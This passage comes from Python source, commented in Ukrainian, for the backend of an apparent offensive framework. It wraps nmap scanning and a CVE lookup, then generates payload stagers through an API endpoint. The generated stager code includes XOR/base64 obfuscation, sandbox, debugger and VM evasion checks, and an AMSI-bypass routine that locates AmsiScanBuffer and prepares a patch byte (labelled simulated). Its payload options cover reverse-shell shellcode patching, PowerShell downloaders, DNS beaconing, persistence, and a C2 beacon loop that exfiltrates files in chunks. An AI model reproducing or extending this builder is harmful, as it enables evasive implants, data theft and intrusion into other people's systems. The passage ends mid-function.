            host_ip = host_node.find('address').get('addr') if host_node.find('address') is not None else "N/A"
            hostscript_node = host_node.find('hostscript')
            if hostscript_node:
                host_scripts_output = []
                for script_node in hostscript_node.findall('script'):
                    script_id = script_node.get('id', 'N/A')
                    script_data = script_node.get('output', '')
                    structured_script_data = {}
                    for elem_node in script_node.findall('elem'):
                        key = elem_node.get('key')
                        if key: structured_script_data[key] = elem_node.text
                    tables_data = []
                    for table_node in script_node.findall('table'):
                        table_dict = {}
                        for elem_node in table_node.findall('elem'):
                            key = elem_node.get('key')
                            if key: table_dict[key] = elem_node.text
                        if table_dict: tables_data.append(table_dict)
                    
                    host_scripts_output.append({
                        "id": script_id, 
                        "output": script_data,
                        "structured_data": structured_script_data,
                        "tables": tables_data
                    })
                    log_messages.append(f"[NMAP_XML_PARSE_HOSTSCRIPT] Знайдено хост-скрипт '{script_id}' для {host_ip}.")
                
                # Додаємо хост-скрипти до інформації про ОС або як окремий запис
                # Для простоти, можна додати до першого запису ОС для цього хоста, або створити новий запис
                # якщо інформації про ОС немає
                os_info_entry = next((os_info for os_info in parsed_os_info if os_info["host_ip"] == host_ip), None)
                if os_info_entry:
                    if "host_scripts" not in os_info_entry:
                        os_info_entry["host_scripts"] = []
                    os_info_entry["host_scripts"].extend(host_scripts_output)
                elif host_scripts_output: # Якщо ОС не знайдено, але є хост-скрипти
                    parsed_os_info.append({
                        "host_ip": host_ip, "name": "N/A (Host Scripts Only)", "accuracy": "N/A",
                        "family": "", "generation": "", "cpes": [],
                        "host_scripts": host_scripts_output
                    })


        log_messages.append(f"[NMAP_XML_PARSE_SUCCESS] Успішно розпарсено XML, знайдено {len(parsed_services)} відкритих сервісів та {len(parsed_os_info)} записів ОС/хост-скриптів.")
    except ET.ParseError as e_parse:
        log_messages.append(f"[NMAP_XML_PARSE_ERROR] Помилка парсингу XML: {e_parse}")
    except Exception as e_generic:
        log_messages.append(f"[NMAP_XML_PARSE_FATAL] Непередбачена помилка під час парсингу XML: {e_generic}")
    return parsed_services, parsed_os_info

def conceptual_cve_lookup_be(services_info: list, log_messages: list) -> list[dict]:
    # ... (Код без змін) ...
    found_cves = []
    log_messages.append(f"[CVE_LOOKUP_BE_INFO] Пошук CVE для {len(services_info)} виявлених сервісів (з XML).")
    for service_item in services_info:
        service_key_raw = service_item.get("service_key_for_cve", "").lower().strip()
        possible_keys = [service_key_raw]
        product_only = service_item.get("product", "").lower().strip()
        if product_only and product_only != service_key_raw:
            possible_keys.append(product_only)
        service_name_only = service_item.get("service_name", "").lower().strip()
        if service_name_only and service_name_only != service_key_raw and service_name_only != product_only:
            possible_keys.append(service_name_only)
        cves_for_service = []
        for key_attempt in possible_keys:
            if not key_attempt: continue
            if key_attempt in CONCEPTUAL_CVE_DATABASE_BE:
                cves_for_service.extend(CONCEPTUAL_CVE_DATABASE_BE[key_attempt])
                log_messages.append(f"[CVE_LOOKUP_BE_DEBUG] Точне співпадіння для ключа '{key_attempt}' (порт {service_item.get('port')}).")
                break
            for db_key, db_cves_list in CONCEPTUAL_CVE_DATABASE_BE.items():
                if key_attempt.startswith(db_key.split(' ')[0]) and key_attempt in db_key:
                    cves_for_service.extend(db_cves_list)
                    log_messages.append(f"[CVE_LOOKUP_BE_DEBUG] Часткове співпадіння для '{key_attempt}' -> знайдено CVE для '{db_key}' (порт {service_item.get('port')}).")
        unique_cve_ids_for_service = set()
        final_cves_for_this_service = []
        for cve_entry in cves_for_service:
            if cve_entry['cve_id'] not in unique_cve_ids_for_service:
                final_cves_for_this_service.append(cve_entry)
                unique_cve_ids_for_service.add(cve_entry['cve_id'])
        if final_cves_for_this_service:
            log_messages.append(f"[CVE_LOOKUP_BE_SUCCESS] Знайдено CVE для сервісу '{service_key_raw}' (порт {service_item.get('port')}):")
            for cve_entry in final_cves_for_this_service:
                log_messages.append(f"  - {cve_entry['cve_id']} ({cve_entry['severity']}): {cve_entry['summary'][:70]}...")
                found_cves.append({
                    "port": service_item.get("port"), "service_key": service_key_raw,
                    "matched_db_key": key_attempt, "cve_id": cve_entry['cve_id'],
                    "severity": cve_entry['severity'], "summary": cve_entry['summary']
                })
        elif service_key_raw:
            log_messages.append(f"[CVE_LOOKUP_BE_INFO] CVE не знайдено для сервісу '{service_key_raw}' (порт {service_item.get('port')}) у концептуальній базі.")
    if not found_cves:
        log_messages.append("[CVE_LOOKUP_BE_INFO] Відповідних CVE не знайдено в концептуальній базі для жодного сервісу.")
    return found_cves

def perform_nmap_scan_be(target: str, options: list = None, use_xml_output: bool = False, recon_type_hint: str = None) -> tuple[list[str], str, list[dict], list[dict]]:
    # ... (Код без змін від v1.9.5, але parse_nmap_xml_output_for_services тепер витягує скрипти) ...
    log = [f"[RECON_NMAP_BE_INFO] Запуск nmap для: {target}, опції: {options}, XML: {use_xml_output}, Тип: {recon_type_hint}"]
    base_command = ["nmap"]
    effective_options = list(options) if options else []

    if use_xml_output:
        xml_output_option_present = any("-oX" in opt for opt in effective_options)
        if not xml_output_option_present:
            effective_options.extend(["-oX", "-"])
        if not any("-sV" in opt for opt in effective_options):
             effective_options.append("-sV")
        if not any("-O" in opt for opt in effective_options) and not any("-A" in opt for opt in effective_options):
             effective_options.append("-O")
    
    if recon_type_hint == "port_scan_nmap_vuln_scripts" and not options:
        effective_options.extend(["-sV", "--script", "vuln", "-Pn"]) 
        log.append("[RECON_NMAP_BE_INFO] Використання дефолтних опцій для vuln_scripts: -sV --script vuln -Pn")
        if not any("-oX" in opt for opt in effective_options): # Переконуємося, що XML є для vuln_scripts
            effective_options.extend(["-oX", "-"])
    elif not effective_options: 
        effective_options = ["-sV", "-T4", "-Pn"] if not use_xml_output else ["-sV", "-O", "-T4", "-Pn", "-oX", "-"]


    allowed_options_prefixes = ["-sV", "-Pn", "-T4", "-p", "-F", "-A", "-O", "--top-ports", "-sS", "-sU", "-sC", "-oX", "-oN", "-oG", "-iL", "--script", "--script-args"]
    final_command_parts = [base_command[0]]
    seen_options_main = set()
    has_A_option = any("-A" in opt for opt in effective_options)
    if has_A_option:
        seen_options_main.add("-sV")
        seen_options_main.add("-O")
    temp_opts_for_cmd = []
    i = 0
    while i < len(effective_options):
        opt = effective_options[i]
        main_opt_part = opt.split(' ')[0]
        is_allowed = any(opt.startswith(p) for p in allowed_options_prefixes)
        is_arg_like = opt.replace("-","").isalnum() or re.match(r"^\d+(-\d+)?(,\d+(-\d+)?)*$", opt) or "=" in opt or "," in opt 

        if is_allowed:
            if main_opt_part not in seen_options_main or main_opt_part in ["--script", "--script-args"]: 
                temp_opts_for_cmd.append(opt)
                if main_opt_part not in ["--script", "--script-args"]: 
                    seen_options_main.add(main_opt_part)
                
                if main_opt_part in ["-p", "--top-ports", "-oX", "-oN", "-oG", "-iL", "--script", "--script-args"] and (i + 1) < len(effective_options):
                    is_next_another_option = any(effective_options[i+1].startswith(p) for p in allowed_options_prefixes)
                    if not is_next_another_option or effective_options[i+1].startswith("vuln") or "=" in effective_options[i+1] or "," in effective_options[i+1]: # Дозволяємо аргументи типу "vuln", "http-title.nse" або "arg1=val1,arg2=val2"
                        temp_opts_for_cmd.append(effective_options[i+1])
                        i += 1
            elif main_opt_part == "-oX" and opt == "-oX" and (i + 1) < len(effective_options) and effective_options[i+1] == "-":
                 if not ("-oX" in temp_opts_for_cmd and "-" in temp_opts_for_cmd[temp_opts_for_cmd.index("-oX")+1:]):
                    temp_opts_for_cmd.append("-oX")
                    temp_opts_for_cmd.append("-")
                    i += 1
            else:
                log.append(f"[RECON_NMAP_BE_WARN] Опцію '{main_opt_part}' або її варіант вже додано або вона конфліктує. Пропускається: {opt}")
        elif is_arg_like and temp_opts_for_cmd and any(temp_opts_for_cmd[-1].startswith(p) for p in ["-p", "--top-ports", "-oX", "-oN", "-oG", "-iL", "--script", "--script-args"]):
             log.append(f"[RECON_NMAP_BE_DEBUG] Додавання потенційного аргументу '{opt}' для попередньої опції.")
             temp_opts_for_cmd.append(opt)
        elif not is_allowed:
             log.append(f"[RECON_NMAP_BE_WARN] Недозволена або невідома опція nmap: {opt}")
        i += 1

    final_command_parts.extend(temp_opts_for_cmd)
    final_command_parts.append(target)
    log.append(f"[RECON_NMAP_BE_CMD_FINAL] Команда nmap: {' '.join(final_command_parts)}")
    parsed_services_list = []
    parsed_os_list = []
    raw_output_text = "" # Це буде XML або текстовий вивід
    try:
        process = subprocess.run(final_command_parts, capture_output=True, text=True, timeout=600, check=False)
        raw_output_text = process.stdout if process.returncode == 0 else process.stderr # Зберігаємо XML тут
        if process.returncode == 0:
            log.append("[RECON_NMAP_BE_SUCCESS] Nmap сканування успішно завершено.")
            # Для всіх типів, що використовують XML, парсимо його
            if any("-oX" in opt and "-" in final_command_parts[final_command_parts.index(opt)+1:] for opt in final_command_parts if opt == "-oX"): # Перевіряємо, чи був запит на XML вивід у stdout
                parsed_services_list, parsed_os_list = parse_nmap_xml_output_for_services(raw_output_text, log)
                log.append(f"[RECON_NMAP_BE_PARSE_XML] Знайдено {len(parsed_services_list)} сервісів та {len(parsed_os_list)} записів ОС/хост-скриптів з XML.")
                # results_text_for_display буде встановлено пізніше в handle_run_recon
            else: # Якщо XML не запитувався, raw_output_text - це звичайний текстовий вивід
                pass # results_text_for_display буде встановлено в handle_run_recon
        else:
            error_message = f"Помилка виконання Nmap (код: {process.returncode}): {raw_output_text}"
            log.append(f"[RECON_NMAP_BE_ERROR] {error_message}")
            # results_text_for_display буде встановлено в handle_run_recon
            if "Host seems down" in raw_output_text:
                 raw_output_text += "\nПідказка: Ціль може бути недоступна або блокувати ping. Спробуйте опцію -Pn."
            elif " consentement explicite" in raw_output_text or "explicit permission" in raw_output_text :
                 raw_output_text += "\nПОПЕРЕДЖЕННЯ NMAP: Сканування мереж без явного дозволу є незаконним у багатьох країнах."
    except FileNotFoundError:
        log.append("[RECON_NMAP_BE_ERROR] Команду nmap не знайдено.")
        raw_output_text = "Помилка: nmap не встановлено або не знайдено в системному PATH."
    except subprocess.TimeoutExpired:
        log.append("[RECON_NMAP_BE_ERROR] Час очікування nmap сканування вичерпано.")
        raw_output_text = f"Помилка: Час очікування сканування nmap для {target} вичерпано."
    except Exception as e:
        log.append(f"[RECON_NMAP_BE_FATAL] Непередбачена помилка: {str(e)}")
        raw_output_text = f"Непередбачена помилка під час nmap сканування: {str(e)}"
    
    # raw_output_text тепер містить XML або текстовий вивід (або помилку)
    # parsed_services_list та parsed_os_list містять розібрані дані, якщо XML був успішно оброблений
    return log, raw_output_text, parsed_services_list, parsed_os_list


def generate_simulated_operational_logs_be() -> list[dict]:
    # ... (Код без змін) ...
    logs = []
    log_levels = ["INFO", "WARN", "ERROR", "SUCCESS"]
    components = ["PayloadGen_BE", "Recon_BE", "C2_Implant_Alpha_BE", "C2_Implant_Beta_BE", "FrameworkCore_BE", "AdaptationEngine_BE"]
    messages_templates = [
        "Операцію '{op}' запущено для цілі '{tgt}'.", "Сканування порту {port} для {tgt} завершено.",
        "Виявлено потенційну вразливість: {cve} на {tgt}.", "Пейлоад типу '{ptype}' успішно доставлено на {imp_id}.",
        "Помилка з'єднання з C2 для імпланта {imp_id}.", "Імплант {imp_id} отримав нове завдання: '{task}'.",
        "Ексфільтрація даних: '{file}' chunk {c}/{t} з {imp_id}.", "Виявлено підозрілу активність EDR на хості {host_ip}.",
        "Правило метаморфізму #{rule_id} оновлено автоматично.", "Імплант {imp_id} перейшов у сплячий режим на {N} хвилин.",
        "Невдала спроба підвищення привілеїв на {host_ip} (користувач: {usr}).", "Успішне виконання '{cmd}' на імпланті {imp_id}."
    ]
    for _ in range(random.randint(15, 25)):
        log_entry = {
            "timestamp": datetime.fromtimestamp(time.time() - random.randint(0, 3600 * 2)).strftime('%Y-%m-%d %H:%M:%S'),
            "level": random.choice(log_levels), "component": random.choice(components),
            "message": random.choice(messages_templates).format(
                op=random.choice(["recon", "deploy", "exfil"]),
                tgt=f"{random.randint(10,192)}.{random.randint(0,168)}.{random.randint(1,200)}.{random.randint(1,254)}",
                port=random.choice([80,443,22,3389]), cve=f"CVE-202{random.randint(3,5)}-{random.randint(1000,29999)}",
                ptype=random.choice(CONCEPTUAL_PARAMS_SCHEMA_BE["payload_archetype"]["allowed_values"]), imp_id=f"IMPLNT-{random.randint(100,999)}",
                task=random.choice(["listdir /tmp","getsysinfo"]), file=f"secret_{random.randint(1,10)}.dat", c=random.randint(1,5),t=5,
                host_ip=f"10.1.1.{random.randint(10,50)}", rule_id=random.randint(100,200), N=random.randint(5,60),
                usr=random.choice(["system","admin","user"]), cmd=random.choice(["whoami","ipconfig"])
            )
        }
        logs.append(log_entry)
    logs.sort(key=lambda x: x["timestamp"])
    return logs

def get_simulated_stats_be() -> dict:
    # ... (Код без змін) ...
    global simulated_implants_be
    return {
        "successRate": random.randint(60, 95), "detectionRate": random.randint(5, 25),
        "bestArchetype": random.choice(CONCEPTUAL_PARAMS_SCHEMA_BE["payload_archetype"]["allowed_values"]),
        "activeImplants": len(simulated_implants_be)
    }

app = Flask(__name__)
CORS(app)
initialize_simulated_implants_be()

@app.route('/api/generate_payload', methods=['POST'])
def handle_generate_payload():
    # ... (Код без змін від v1.9.5) ...
    log_messages = [f"[BACKEND v{VERSION_BACKEND}] Запит /api/generate_payload о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
    try:
        data = request.get_json()
        if not data:
            log_messages.append("[BACKEND_ERROR] Не отримано JSON.")
            return jsonify({"success": False, "error": "No JSON", "generationLog": "\n".join(log_messages)}), 400

        log_messages.append(f"[BACKEND_INFO] Параметри: {json.dumps(data, indent=2, ensure_ascii=False)}")
        is_valid, validated_params, errors = conceptual_validate_parameters_be(data, CONCEPTUAL_PARAMS_SCHEMA_BE)
        if not is_valid:
            log_messages.append(f"[BACKEND_VALIDATION_FAILURE] Помилки: {errors}")
            return jsonify({"success": False, "error": "Validation failed", "errors": errors, "generationLog": "\n".join(log_messages)}), 400

        log_messages.append("[BACKEND_VALIDATION_SUCCESS] Валідація успішна.")
        archetype_name = validated_params.get("payload_archetype")
        archetype_details = CONCEPTUAL_ARCHETYPE_TEMPLATES_BE.get(archetype_name)
        log_messages.append(f"[BACKEND_ARCHETYPE_INFO] Архетип: {archetype_name} - {archetype_details['description']}")

        data_to_obfuscate_or_patch = {}
        if archetype_name == "demo_echo_payload":
            data_to_obfuscate_or_patch['message'] = validated_params.get("message_to_echo", "Default Echo Message")
        elif archetype_name == "demo_file_lister_payload":
            data_to_obfuscate_or_patch['directory'] = validated_params.get("directory_to_list", ".")
        elif archetype_name == "demo_c2_beacon_payload":
            data_to_obfuscate_or_patch['c2_url'] = validated_params.get("c2_beacon_endpoint")
        elif archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64"]:
            shellcode_hex_input = validated_params.get("shellcode_hex_placeholder")
            lhost_for_patch = validated_params.get("c2_target_host")
            lport_for_patch = validated_params.get("c2_target_port")
            log_messages.append(f"[BACKEND_SHELLCODE_PREP] LHOST: {lhost_for_patch}, LPORT: {lport_for_patch} для патчингу шеллкоду.")
            data_to_obfuscate_or_patch['shellcode'] = patch_shellcode_be(shellcode_hex_input, lhost_for_patch, lport_for_patch, log_messages)
        elif archetype_name == "powershell_downloader_stager":
            data_to_obfuscate_or_patch['ps_url'] = validated_params.get("powershell_script_url")
        elif archetype_name == "dns_beacon_c2_concept":
            data_to_obfuscate_or_patch['dns_zone'] = validated_params.get("c2_dns_zone")
        elif archetype_name == "windows_simple_persistence_stager":
            data_to_obfuscate_or_patch['persistence_method'] = validated_params.get("persistence_method")
            data_to_obfuscate_or_patch['command_to_persist'] = validated_params.get("command_to_persist")
            data_to_obfuscate_or_patch['artifact_name'] = validated_params.get("artifact_name")


        key = validated_params.get("obfuscation_key", "DefaultFrameworkKey")
        obfuscated_payload_params_json = json.dumps(data_to_obfuscate_or_patch)
        log_messages.append(f"[BACKEND_OBF_INFO] Обфускація параметрів пейлоада: '{obfuscated_payload_params_json[:100]}...' з ключем '{key}'.")
        obfuscated_data_raw = xor_cipher(obfuscated_payload_params_json, key)
        obfuscated_data_b64 = b64_encode_str(obfuscated_data_raw)
        log_messages.append(f"[BACKEND_OBF_SUCCESS] Дані обфусковано: {obfuscated_data_b64[:40]}...")

        log_messages.append(f"[BACKEND_STAGER_GEN_INFO] Генерація стейджера...")

        stager_code_lines = [
            f"# SYNTAX Conceptual Python Stager (Backend Generated v{VERSION_BACKEND})",
            f"# Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"# Archetype: {archetype_name}",
            f"OBFUSCATION_KEY_EMBEDDED = \"{key}\"",
            f"OBF_DATA_B64 = \"{obfuscated_data_b64}\"",
            f"METAMORPHISM_APPLIED = {validated_params.get('enable_stager_metamorphism', False)}",
            f"EVASION_CHECKS_APPLIED = {validated_params.get('enable_evasion_checks', False)}",
            f"AMSI_BYPASS_CONCEPT_APPLIED = {validated_params.get('enable_amsi_bypass_concept', False)}",
            f"DISK_SIZE_CHECK_APPLIED = {validated_params.get('enable_disk_size_check', False)}",
        ]

        if archetype_name == "powershell_downloader_stager":
            ps_args = validated_params.get("powershell_execution_args", "")
            stager_code_lines.append(f"POWERSHELL_EXEC_ARGS = \"{ps_args}\"")
        elif archetype_name == "demo_c2_beacon_payload":
            stager_implant_id = f"STGIMPLNT-{random.randint(100,999)}"
            stager_code_lines.append(f"STAGER_IMPLANT_ID = \"{stager_implant_id}\"")
            stager_code_lines.append(f"BEACON_INTERVAL_SEC = {random.randint(10, 25)}")
        elif archetype_name == "dns_beacon_c2_concept":
            stager_implant_id = f"DNSIMPLNT-{random.randint(100,999)}"
            stager_code_lines.append(f"STAGER_IMPLANT_ID = \"{stager_implant_id}\"")
            stager_code_lines.append(f"DNS_BEACON_INTERVAL_SEC = {random.randint(25, 55)}")

        stager_code_lines.extend(["", "import base64", "import os", "import time", "import random", "import string", "import subprocess", "import socket", "import json as json_stager_module"])
        if archetype_name == "demo_c2_beacon_payload" or archetype_name == "dns_beacon_c2_concept":
            stager_code_lines.extend(["import urllib.request", "import urllib.error"])

        if archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64", "windows_simple_persistence_stager"] or \
           validated_params.get('enable_evasion_checks') or validated_params.get('enable_amsi_bypass_concept') or validated_params.get('enable_disk_size_check'):
            stager_code_lines.append("import ctypes")
            if archetype_name == "reverse_shell_tcp_shellcode_linux_x64" or (os.name != 'nt' and validated_params.get('enable_disk_size_check')):
                 stager_code_lines.append("import shutil")
            if archetype_name == "reverse_shell_tcp_shellcode_linux_x64":
                stager_code_lines.append("import mmap as mmap_module")
        stager_code_lines.append("")

        decode_func_name_runtime = "dx_runtime"
        evasion_func_name_runtime = "ec_runtime"
        execute_func_name_runtime = "ex_runtime"

        stager_code_lines.extend([
            f"def {decode_func_name_runtime}(b64_data, key_str):",
            "    try:",
            "        temp_decoded_bytes = base64.b64decode(b64_data.encode('utf-8'))",
            "        temp_decoded_str = temp_decoded_bytes.decode('latin-1')",
            "    except Exception as e_decode: return f\"DECODE_ERROR: {{str(e_decode)}}\"",
            "    o_chars = []",
            "    for i_char_idx in range(len(temp_decoded_str)):",
            "        o_chars.append(chr(ord(temp_decoded_str[i_char_idx]) ^ ord(key_str[i_char_idx % len(key_str)])))",
            "    return \"\".join(o_chars)",
            "",
            f"def {evasion_func_name_runtime}():",
            # ... (код ec_runtime з v1.9.5) ...
            "    print(\"[STAGER_EVASION] Виконання розширених концептуальних перевірок ухилення...\")",
            "    indicators = []",
            "    common_sandbox_users = [\"sandbox\", \"test\", \"admin\", \"user\", \"vagrant\", \"wdagutilityaccount\", \"maltest\", \"emulator\", \"vmware\", \"virtualbox\", \"蜜罐\", \"ताम्बू\", \"песочница\"]",
            "    try:",
            "        current_user = os.getlogin().lower()",
            "        if current_user in common_sandbox_users: indicators.append('common_username_detected')",
            "    except Exception: pass",
            "    try:",
            "        if os.name == 'nt':",
            "            kernel32 = ctypes.windll.kernel32",
            "            if kernel32.IsDebuggerPresent() != 0:",
            "                indicators.append('debugger_present_win')",
            "    except Exception: pass",
            "    try:",
            "        sleep_duration_seconds = random.uniform(1.8, 3.3)",
            "        time_before_sleep = time.monotonic()",
            "        time.sleep(sleep_duration_seconds)",
            "        time_after_sleep = time.monotonic()",
            "        elapsed_time = time_after_sleep - time_before_sleep",
            "        if elapsed_time < (sleep_duration_seconds * 0.65):",
            "            indicators.append('time_acceleration_heuristic')",
            "    except Exception: pass",
            "    vm_files_artifacts = [",
            "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\VBoxMouse.sys\", \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\VBoxGuest.sys\",",
            "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vmhgfs.sys\", \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vmmouse.sys\",",
            "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vpc-s3.sys\", \"/usr/bin/VBoxClient\", \"/opt/VBoxGuestAdditions-*/init/vboxadd\"",
            "    ]",
            "    for vm_file_path in vm_files_artifacts:",
            "        if os.path.exists(vm_file_path):",
            "            indicators.append(f'vm_file_artifact_{os.path.basename(vm_file_path).lower().replace(\".sys\",\"\")}')",
            "            break",
            "    try:",
            "        hostname = socket.gethostname().lower()",
            "        suspicious_host_keywords = [\"sandbox\", \"virtual\", \"vm-\", \"test\", \"debug\", \"analysis\", \"lab\", \"desktop-\", \"DESKTOP-\"]",
            "        if any(keyword in hostname for keyword in suspicious_host_keywords):",
            "            indicators.append('suspicious_hostname_keyword')",
            "    except Exception: pass",
            "    try:",
            "        cpu_count = os.cpu_count()",
            "        if cpu_count is not None and cpu_count < 2:",
            "            indicators.append('low_cpu_core_count')",
            "    except Exception: pass",
            "    try:",
            "        if os.name == 'nt':",
            "            class POINT(ctypes.Structure): _fields_ = [(\"x\", ctypes.c_long), (\"y\", ctypes.c_long)]",
            "            pt1 = POINT()",
            "            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt1))",
            "            time.sleep(random.uniform(0.3, 0.7))",
            "            pt2 = POINT()",
            "            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt2))",
            "            if pt1.x == pt2.x and pt1.y == pt2.y:",
            "                 indicators.append('no_mouse_activity_win')",
            "    except Exception: pass",
            "    suspicious_processes = ['wireshark.exe', 'procmon.exe', 'procexp.exe', 'ollydbg.exe', 'x64dbg.exe', 'idag.exe', 'idaw.exe', 'fiddler.exe', 'tcpview.exe', 'autoruns.exe']",
            "    if random.random() < 0.1: indicators.append('simulated_suspicious_process_check')",
            "",
            "    if random.random() < 0.08: indicators.append('simulated_api_hook_check')",
            "",
            "    if AMSI_BYPASS_CONCEPT_APPLIED and os.name == 'nt':",
            "        print(\"[STAGER_EVASION_AMSI] Спроба концептуального обходу AMSI...\")",
            "        try:",
            "            amsi_dll_name_b64 = 'YW1zaS5kbGw='",
            "            amsi_scan_buffer_b64 = 'QW1zaVNjYW5CdWZmZXI='",
            "            amsi_dll_name = base64.b64decode(amsi_dll_name_b64).decode('utf-8')",
            "            amsi_scan_buffer_name = base64.b64decode(amsi_scan_buffer_b64).decode('utf-8')",
            "",
            "            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)",
            "            amsi_handle = kernel32.LoadLibraryA(amsi_dll_name.encode('ascii'))",
            "            if not amsi_handle:",
            "                print(f\"[STAGER_EVASION_AMSI_WARN] Не вдалося завантажити {{amsi_dll_name}}: {{ctypes.get_last_error()}}\")",
            "            else:",
            "                amsi_scan_buffer_addr = kernel32.GetProcAddress(amsi_handle, amsi_scan_buffer_name.encode('ascii'))",
            "                if not amsi_scan_buffer_addr:",
            "                    print(f\"[STAGER_EVASION_AMSI_WARN] Не вдалося отримати адресу {{amsi_scan_buffer_name}}: {{ctypes.get_last_error()}}\")",
            "                else:",
            "                    patch_code_hex = 'C3'",
            "                    patch_byte = bytes.fromhex(patch_code_hex)[0]",
            "                    original_byte = (ctypes.c_char).from_address(amsi_scan_buffer_addr).value",
            "                    print(f\"[STAGER_EVASION_AMSI_SIM] Концептуальний 'патчинг' {{amsi_scan_buffer_name}} за адресою {{hex(amsi_scan_buffer_addr)}}.\")",
            "                    print(f\"  Оригінальний байт: {{hex(ord(original_byte))}}, 'патч': {{hex(patch_byte)}} (симуляція, не застосовано).\")",
            "                    indicators.append('amsi_bypass_attempted_sim')",
            "            if amsi_handle : kernel32.FreeLibrary(amsi_handle)",
            "        except Exception as e_amsi:",
            "            print(f\"[STAGER_EVASION_AMSI_ERROR] Помилка під час симуляції обходу AMSI: {{e_amsi}}\")",
            "            indicators.append('amsi_bypass_exception_sim')",
            "",
            "    if DISK_SIZE_CHECK_APPLIED:",
            "        print(\"[STAGER_EVASION_DISK] Концептуальна перевірка розміру диска...\")",
            "        try:",
            "            min_disk_size_gb_threshold = 50",
            "            total_bytes = 0",
            "            if os.name == 'nt':",
            "                free_bytes_available_to_caller = ctypes.c_ulonglong(0)",
            "                total_number_of_bytes = ctypes.c_ulonglong(0)",
            "                total_number_of_free_bytes = ctypes.c_ulonglong(0)",
            "                kernel32 = ctypes.windll.kernel32",
            "                success = kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p('C:\\\\'),",
            "                                                      ctypes.byref(free_bytes_available_to_caller),",
            "                                                      ctypes.byref(total_number_of_bytes),",
            "                                                      ctypes.byref(total_number_of_free_bytes))",
            "                if success:",
            "                    total_bytes = total_number_of_bytes.value",
            "                else:",
            "                    print(f\"[STAGER_EVASION_DISK_WARN_WIN] Не вдалося отримати розмір диска C:: {{ctypes.WinError()}}\")",
            "            else:",
            "                try:",
            "                    disk_usage_stats = shutil.disk_usage('/')",
            "                    total_bytes = disk_usage_stats.total",
            "                except NameError:",
            "                    print(\"[STAGER_EVASION_DISK_WARN_POSIX] Модуль shutil не імпортовано для перевірки диска.\")",
            "                except Exception as e_disk_posix:",
            "                    print(f\"[STAGER_EVASION_DISK_WARN_POSIX] Помилка отримання розміру диска /: {{e_disk_posix}}\")",
            "",
            "            if total_bytes > 0:",
            "                total_gb = total_bytes / (1024**3)",
            "                print(f\"[STAGER_EVASION_DISK_INFO] Загальний розмір диска: {{total_gb:.2f}} GB.\")",
            "                if total_gb < min_disk_size_gb_threshold:",
            "                    indicators.append(f'low_disk_size_{{total_gb:.0f}}gb')",
            "            else:",
            "                 print(\"[STAGER_EVASION_DISK_INFO] Не вдалося визначити загальний розмір диска.\")",
            "        except Exception as e_disk_check:",
            "            print(f\"[STAGER_EVASION_DISK_ERROR] Помилка під час перевірки розміру диска: {{e_disk_check}}\")",
            "            indicators.append('disk_size_check_exception')",
            "",
            "    if indicators:",
            "        print(f\"[STAGER_EVASION] Виявлено індикатори аналітичного середовища: {{', '.join(indicators)}}! Зміна поведінки або вихід.\")",
            "        return True",
            "    print(\"[STAGER_EVASION] Перевірки ухилення пройдені (концептуально).\")",
            "    return False",
            "",
            f"def {execute_func_name_runtime}(payload_params_json, arch_type):",
            # ... (код execute_func_name_runtime з v1.9.5) ...
            "    try:",
            "        payload_params = json_stager_module.loads(payload_params_json)",
            "    except Exception as e_json_parse:",
            "        print(f\"[PAYLOAD_ERROR] Помилка розпаковки параметрів пейлоада: {{e_json_parse}}\")",
            "        return",
            "    print(f\"[PAYLOAD ({{arch_type}})] Ініціалізація логіки пейлоада з параметрами: {{payload_params}}\")",
            "    if arch_type == 'demo_c2_beacon_payload':",
            "        beacon_url = payload_params.get('c2_url')",
            "        implant_data = {",
            "            'implant_id': STAGER_IMPLANT_ID,",
            "            'hostname': socket.gethostname(),",
            "            'username': os.getlogin() if hasattr(os, 'getlogin') else 'unknown_user',",
            "            'os_type': os.name,",
            "            'pid': os.getpid(),",
            "            'beacon_interval_sec': BEACON_INTERVAL_SEC",
            "        }",
            "        last_task_result_package = None",
            "        exfil_state = {'active': False, 'file_path': None, 'file_handle': None, 'chunk_size': 512, 'current_chunk': 0, 'total_chunks': 0}",
            "",
            "        while True:",
            "            current_beacon_payload = implant_data.copy()",
            "            if last_task_result_package:",
            "                current_beacon_payload['last_task_id'] = last_task_result_package.get('task_id')",
            "                current_beacon_payload['last_task_result'] = last_task_result_package.get('result')",
            "                current_beacon_payload['task_success'] = last_task_result_package.get('success', False)",
            "                last_task_result_package = None",
            "",
            "            if exfil_state['active'] and exfil_state['file_handle']:",
            "                try:",
            "                    chunk_data = exfil_state['file_handle'].read(exfil_state['chunk_size'])",
            "                    if chunk_data:",
            "                        chunk_b64 = base64.b64encode(chunk_data).decode('utf-8')",
            "                        exfil_result = {",
            "                            'file_path': exfil_state['file_path'],",
            "                            'chunk_num': exfil_state['current_chunk'],",
            "                            'total_chunks': exfil_state['total_chunks'],",
            "                            'data_b64': chunk_b64,",
            "                            'is_final': False",
            "                        }",
            "                        current_beacon_payload['file_exfil_chunk'] = exfil_result",
            "                        print(f\"[PAYLOAD_EXFIL] Підготовлено чанк #{{exfil_state['current_chunk']}} для {{exfil_state['file_path']}}\")",
            "                        exfil_state['current_chunk'] += 1",
            "                    else: ",
            "                        exfil_state['file_handle'].close()",
            "                        exfil_result = {",
            "                            'file_path': exfil_state['file_path'],",
            "                            'chunk_num': exfil_state['current_chunk'] -1, ",
            "                            'total_chunks': exfil_state['total_chunks'],",
            "                            'data_b64': '',",
            "                            'is_final': True",
            "                        }",
            "                        current_beacon_payload['file_exfil_chunk'] = exfil_result",
            "                        print(f\"[PAYLOAD_EXFIL] Завершено ексфільтрацію файлу {{exfil_state['file_path']}}.\")",
            "                        exfil_state = {'active': False, 'file_path': None, 'file_handle': None, 'chunk_size': 512, 'current_chunk': 0, 'total_chunks': 0}",
            "                except Exception as e_exfil_read:",
